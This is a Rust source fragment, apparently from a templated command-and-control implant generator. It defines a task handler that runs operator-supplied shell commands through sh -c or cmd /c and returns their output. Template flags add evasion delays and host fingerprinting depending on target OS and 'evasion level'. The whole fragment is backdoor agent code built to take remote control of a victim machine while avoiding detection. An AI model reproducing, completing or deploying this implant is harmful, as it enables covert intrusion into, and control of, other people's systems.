// === COMMAND EXECUTION ===
fn execute_command(cmd: &str, args: &[String]) -> Result<String, String> {
    {{#ifEvasionLevel 2}}
    // Add random delay before execution
    let mut rng = rand::thread_rng();
    let delay = rng.gen_range(100..500);
    thread::sleep(Duration::from_millis(delay));
    {{/ifEvasionLevel}}

    match Command::new(cmd).args(args).output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if output.status.success() {
                Ok(stdout.to_string())
            } else {
                Err(stderr.to_string())
            }
        },
        Err(e) => Err(format!("Command failed: {}", e)),
    }
}

fn process_task(task: Task) -> String {
    match task.command.as_str() {
        "whoami" => execute_command("whoami", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
        {{#ifOS "windows"}}
        "pwd" => execute_command("cd", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
        "ls" => execute_command("dir", &task.args).unwrap_or_else(|e| format!("Error: {}", e)),
        {{else}}
        "pwd" => execute_command("pwd", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
        "ls" => execute_command("ls", &task.args).unwrap_or_else(|e| format!("Error: {}", e)),
        {{/ifOS}}
        "shell" if !task.args.is_empty() => {
            let shell_cmd = task.args.join(" ");
            {{#ifOS "windows"}}
            execute_command("cmd", &["/c".to_string(), shell_cmd])
            {{else}}
            execute_command("sh", &["-c".to_string(), shell_cmd])
            {{/ifOS}}
                .unwrap_or_else(|e| format!("Error: {}", e))
        },
        {{#ifEvasionLevel 2}}
        "sysinfo" => get_system_info(),
        "fingerprint" => {
            let fp = get_system_fingerprint();
            format!("{:#?}", fp)
        },
        {{/ifEvasionLevel}}
        _ => "Unknown command".to_string(),
    }
}

